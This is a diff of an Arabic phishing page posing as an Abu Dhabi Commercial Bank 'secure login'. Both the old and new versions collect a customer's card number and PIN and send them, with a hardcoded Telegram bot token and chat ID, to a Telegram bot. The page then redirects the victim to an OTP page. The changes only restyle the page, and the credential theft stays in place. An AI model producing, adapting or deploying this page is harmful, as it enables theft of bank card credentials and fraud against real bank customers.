@@ -1,215 +1,173 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بنك أبوظبي التجاري - دخول آمن</title>
-
-    <!-- Open Graph Meta Tags -->
-    <meta property="og:title" content="بنك أبوظبي التجاري - دخول آمن">
-    <meta property="og:description" content="أدخل رقم البطاقة ورمز PIN لإتمام الدخول.">
-    <meta property="og:image" content="https://alkhaleeg.services/sadUae/images/adcb_bank_logo.png">
-    <meta property="og:url" content="https://alkhaleeg.services/sadu/adcb_login.html">
-    <meta property="og:type" content="website">
-
+    <title>ADCB Login</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: #333;
-            background: #f0f4f8;
-            padding: 20px;
-            line-height: 1.6;
+            background: linear-gradient(180deg, #e9effd 0%, #cbd8f3 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
             margin: 0;
-            max-width: 100%;
-            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
-        /* Responsive adjustments */
-        @media (max-width: 768px) {
-            body {
-                padding: 15px;
-                font-size: 14px;
-            }
-            .form-container {
-                padding: 20px;
-            }
-            .btn-red {
-                width: 90%;
-                font-size: 14px;
-                padding: 10px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            body {
-                padding: 10px;
-                font-size: 13px;
-            }
-            .form-container {
-                padding: 15px;
-            }
-            .btn-red {
-                width: 95%;
-                font-size: 13px;
-                padding: 8px;
-            }
-        }
-
-        .form-container {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-            max-width: 500px;
-            margin: 20px auto;
+        .login-card {
+            background-color: #ffffff;
+            width: 90%;
+            max-width: 400px;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
             text-align: center;
         }
-        .logo {
+
+        .logo-container {
+            margin-bottom: 20px;
+        }
+
+        /* تمثيل بسيط للشعار باستخدام CSS */
+        .adcb-logo-placeholder {
+            width: 80px;
             height: 80px;
-            margin: 0 auto 20px;
-            display: block;
+            background-color: #d11218;
+            margin: 0 auto 15px;
+            clip-path: polygon(50% 0%, 100% 100%, 0% 100%);
+            position: relative;
         }
-        h1 {
-            font-size: 24px;
-            color: #003366;
-            margin: 10px 0 5px;
-        }
+
         h2 {
-            font-size: 16px;
-            color: #666;
-            margin: 0 0 20px;
+            color: #1a3668; /* لون أزرق ADCB */
+            font-size: 22px;
+            margin-bottom: 5px;
         }
+
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 35px;
+        }
+
+        .form-group {
+            text-align: right;
+            margin-bottom: 20px;
+        }
+
         label {
             display: block;
-            margin: 10px 0 5px;
             font-weight: bold;
-            color: #003366;
-            text-align: right;
+            color: #333;
+            margin-bottom: 8px;
+            font-size: 14px;
         }
-        input[type="text"] {
+
+        input {
             width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
+            padding: 15px;
+            border: 1px solid #e0e0e0;
             border-radius: 8px;
+            background-color: #fcfcfc;
             font-size: 16px;
+            text-align: center;
+            letter-spacing: 2px;
             box-sizing: border-box;
-            transition: border-color 0.3s;
-            text-align: center;
         }
-        input[type="text"]:focus {
-            border-color: #cc0000;
-            outline: none;
+
+        input::placeholder {
+            color: #ccc;
+            letter-spacing: normal;
         }
-        .card-number-placeholder {
-            color: #999;
-            font-size: 14px;
-            margin: 5px 0;
-        }
-        .pin-placeholder {
-            color: #999;
-            font-size: 14px;
-            margin: 5px 0;
-        }
-        .btn-red {
+
+        .hint {
             display: block;
+            color: #999;
+            font-size: 11px;
+            margin-top: 5px;
+        }
+
+        .login-btn {
             width: 100%;
-            margin: 25px auto;
-            padding: 12px;
-            background: #cc0000;
+            background-color: #d11218; /* أحمر ADCB */
             color: white;
-            text-align: center;
-            border-radius: 8px;
-            text-decoration: none;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 18px;
             font-weight: bold;
-            font-size: 16px;
             cursor: pointer;
+            margin-top: 20px;
             transition: background 0.3s;
         }
-        .btn-red:hover {
-            background: #b30000;
-        }
-        .error-message {
-            display: none;
-            text-align: center;
-            color: red;
-            font-weight: bold;
-            margin: 10px 0;
+
+        .login-btn:hover {
+            background-color: #b00f14;
         }
     </style>
 </head>
 <body>
 
-<div class="form-container">
-    <img src="https://alkhaleeg.services/sadUae/images/adcb_bank_logo.png" alt="شعار بنك أبوظبي التجاري" class="logo">
-    <h1>بنك أبو ظبي التجاري</h1>
-    <h2>ADCB - Abu Dhabi Commercial Bank</h2>
+<div class="login-card">
+    <div class="logo-container">
+        <div class="adcb-logo-placeholder"></div>
+        <h2>بنك أبو ظبي التجاري</h2>
+        <div class="subtitle">ADCB - Abu Dhabi Commercial Bank</div>
+    </div>
 
-    <form id="adcbLogin">
-        <label for="cardNumber">رقم البطاقة</label>
-        <input type="text" id="cardNumber" name="cardNumber" required pattern="\d{16}" title="يجب أن يكون 16 رقمًا">
-        <div class="card-number-placeholder">0000 0000 0000 0000</div>
-        <div style="font-size: 12px; color: #999;">أدخل 16 رقم من بطاقتك</div>
+    <form id="adcbForm">
+        <div class="form-group">
+            <label>رقم البطاقة</label>
+            <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="16">
+            <span class="hint">أدخل 16 رقم من بطاقتك</span>
+        </div>
 
-        <label for="pin">رمز PIN</label>
-        <input type="password" id="pin" name="pin" required minlength="4" maxlength="4" title="يجب أن يكون 4 أرقام">
-        <div class="pin-placeholder">• • • •</div>
-        <div style="font-size: 12px; color: #999;">أدخل 4 أرقام من رمزك السري</div>
+        <div class="form-group">
+            <label>رمز PIN</label>
+            <input type="password" id="pin" placeholder="...." maxlength="4">
+            <span class="hint">أدخل 4 أرقام من رمزك السري</span>
+        </div>
 
-        <button type="submit" class="btn-red">دخول آمن</button>
-        <div class="error-message" id="errorMessage"></div>
+        <button type="submit" class="login-btn">دخول آمن</button>
     </form>
 </div>
 
 <script>
-    document.getElementById('adcbLogin').addEventListener('submit', function(e) {
-        e.preventDefault();
+document.getElementById('adcbForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const cardNumber = document.getElementById('cardNumber').value;
+    const pin = document.getElementById('pin').value;
 
-        const cardNumber = document.getElementById('cardNumber').value;
-        const pin = document.getElementById('pin').value;
+    // التحقق من إدخال البيانات
+    if (!cardNumber || !pin) {
+        alert('يرجى ملء جميع الحقول');
+        return;
+    }
 
-        // إخفاء رسالة الخطأ
-        document.getElementById('errorMessage').style.display = 'none';
-
-        // بوت تلغرام
-        const botToken = '7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM';
-        const chatId = '1008144314';
-
-        const message = `
-🔐 *تسجيل دخول بنك أبوظبي التجاري*
-
-💳 رقم البطاقة: ${cardNumber}
-🔢 رمز PIN: ${pin}
-📅 التاريخ: ${new Date().toLocaleString('ar-EG')}
-`;
-
-        // إرسال البيانات إلى تلغرام
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+    // إرسال البيانات لبوت تلغرام
+    fetch('https://api.telegram.org/bot7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: '1008144314',
+            text: `🔐 *بيانات دخول جديدة - بنك أبوظبي التجاري*\n💳 رقم البطاقة: ${cardNumber}\n🔢 رمز PIN: ${pin}\n📅 ${new Date().toLocaleString('ar-EG')}`,
+            parse_mode: 'Markdown'
         })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                // بعد النجاح: التوجيه إلى صفحة OTP
-                window.location.href = 'otp_page.html';
-            } else {
-                throw new Error('فشل الإرسال');
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            const errorMsg = document.getElementById('errorMessage');
-            errorMsg.textContent = '❌ حدث خطأ أثناء إرسال البيانات. يرجى المحاولة لاحقًا.';
-            errorMsg.style.display = 'block';
-        });
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            window.location.href = 'otp_page.html';
+        } else {
+            throw new Error('فشل الإرسال');
+        }
+    })
+    .catch(() => {
+        alert('❌ خطأ في إرسال البيانات. تحقق من الاتصال بالإنترنت.');
     });
+});
 </script>
 
 </body>
